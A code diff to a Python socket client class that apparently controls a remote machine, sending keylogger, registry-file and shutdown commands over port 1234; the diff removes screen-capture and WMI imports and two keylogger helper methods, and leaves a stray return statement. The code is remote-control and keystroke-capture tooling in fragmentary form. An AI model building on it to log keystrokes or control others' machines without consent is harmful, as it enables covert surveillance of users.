@@ -1,10 +1,6 @@
 import socket
 import pickle
-from tkinter import EXCEPTION
 from boltons import socketutils
-from PIL import ImageGrab
-import os
-import wmi
 
 PORT = 1234
 
@@ -102,23 +98,14 @@ class ClientServices:
         print('REQUEST BEGIN KEYLOGGER')
         self.buff.send('keylogger!F!'.encode())
 
-    def keylogger_CommandHook(self):
-        print(f'\tSend keylogger command: hook')
-        self.buff.send('hook'.encode() + self.DELIM)
-
-        return self.buff.recv_until(self.DELIM).decode()
-
     def keylogger_Command(self, cmd):
         print(f'\tSend keylogger command: {cmd}')
         self.buff.send(cmd.encode() + self.DELIM)
 
-    def keylogger_Send(self):
-        print('\tRequest keylogger data')
-        self.keylogger_Command('send')
-
         return self.buff.recv_until(self.DELIM).decode()
 
-
+  
+  
     # registry func
     def sendRegFile(self, data):
         print('SEND REG FILE')
@@ -170,4 +157,4 @@ class ClientServices:
     # shutdown func
     def sendShutdown(self):
         print('SEND SHUTDOWN SIGNAL')
-        self.buff.sendall('shutdown!F!'.encode())
+        self.buff.send('shutdown!F!'.encode())
